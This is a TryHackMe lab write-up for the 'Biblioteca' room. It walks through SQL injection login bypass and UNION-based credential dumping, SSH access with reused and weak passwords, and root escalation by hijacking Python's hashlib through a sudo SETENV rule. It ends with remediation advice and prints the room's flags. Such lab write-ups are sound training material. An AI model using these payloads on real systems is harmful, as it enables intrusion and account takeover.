# Biblioteca

| Field | Value |
| --- | --- |
| Platform | TryHackMe |
| Room | [Biblioteca](https://tryhackme.com/room/biblioteca) |
| Difficulty | Medium |
| OS | Ubuntu Linux |
| Tags | SQL injection, SSH, sudo SETENV, Python library hijacking |
| Date | 2026-09-01 |

> Shhh. Be very very quiet, no shouting inside the biblioteca.

The box is a classic two-stage Linux machine: unauthenticated SQL injection on a Python web login, then a sudo misconfiguration that lets `hazel` control `PYTHONPATH` while running a root-owned hasher script.

## Contents

- [Reconnaissance](#reconnaissance)
- [SQL injection](#sql-injection)
- [Initial access](#initial-access)
- [User flag](#user-flag)
- [Privilege escalation](#privilege-escalation)
- [Root flag](#root-flag)
- [Remediation](#remediation)

## Reconnaissance

```bash
nmap -Pn -sV -sC -p 22,8000 TARGET
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
```

Port 8000 hosts a Flask/Werkzeug login form that posts to `/login` with `username` and `password`. A registration page exists at `/register` but is not required.

## SQL injection

The login query concatenates user input. Authentication is bypassed with:

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' OR 1=1-- -&password=x
```

The application then renders `Hi smokey!!`, which is the first row of the `users` table. The same sink is usable as a UNION leak. Four columns are required; column 2 is reflected in the welcome string.

```sql
admin' UNION SELECT null,'COL2',null,null-- -
```

Enumerate schema, table, columns, then dump credentials:

```sql
admin' UNION SELECT null,database(),null,null-- -
admin' UNION SELECT null,group_concat(table_name),null,null FROM information_schema.tables WHERE table_schema=database()-- -
admin' UNION SELECT null,group_concat(column_name),null,null FROM information_schema.columns WHERE table_name='users'-- -
admin' UNION SELECT null,group_concat(username,0x3a,password),null,null FROM users-- -
```

Result:

```text
database : website
table    : users
columns  : id, username, password, email
dump     : smokey:My_P@ssW0rd123
```

Equivalent one-liner:

```python
import urllib.parse, urllib.request

payload = "admin' UNION SELECT null,group_concat(username,0x3a,password),null,null FROM users-- -"
data = urllib.parse.urlencode({"username": payload, "password": "x"}).encode()
print(urllib.request.urlopen("http://TARGET:8000/login", data=data).read().decode())
```

## Initial access

The dumped password is reused on SSH:

```bash
ssh smokey@TARGET
# password: My_P@ssW0rd123
```

`smokey` has no sudo rights and cannot read `/home/hazel/user.txt`. `/etc/passwd` shows a second interactive user, `hazel`. The room hint is "weak password"; the password is the username.

```bash
ssh hazel@TARGET
# password: hazel
```

## User flag

```bash
cat /home/hazel/user.txt
```

```text
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
```

## Privilege escalation

```bash
sudo -l
```

```text
User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

`SETENV` plus `NOPASSWD` is the entire privesc. `hasher.py` is root-owned but world-readable and starts with a normal import:

```python
import hashlib

def hashing(passw):
    md5 = hashlib.md5(passw.encode())
    print("Your MD5 hash is: ", end="")
    print(md5.hexdigest())
    # sha256 / sha1 follow
```

Python searches `PYTHONPATH` before the standard library. Drop a fake `hashlib.py` and point sudo at it:

```bash
cat > /tmp/hashlib.py << 'PY'
import os

def md5(s):
    os.system("id; cat /root/root.txt")
    class H:
        def hexdigest(self):
            return "x"
    return H()
PY

printf 'test\n' | sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

`hashlib.md5()` runs as root. The later `sha256` call fails because the fake module is incomplete; that does not matter once `/root/root.txt` has been printed.

A cleaner variant that yields an interactive root shell:

```python
import os

def md5(s):
    os.system("/bin/bash -p")
    return s
```

```bash
sudo PYTHONPATH=/dev/shm /usr/bin/python3 /home/hazel/hasher.py
```

## Root flag

```text
THM{PytH0n_LiBr@RY_H1j@acKIn6}
```

## Remediation

- Parameterize the login query. Do not concatenate usernames into SQL.
- Store password hashes, not plaintext.
- Do not reuse application credentials as SSH passwords, and do not use the username as the password.
- Avoid `SETENV` on sudo rules that invoke interpreters. If `hasher.py` must run as root, pin the environment (`env_reset`, no `SETENV`) and do not let the user control `PYTHONPATH`.
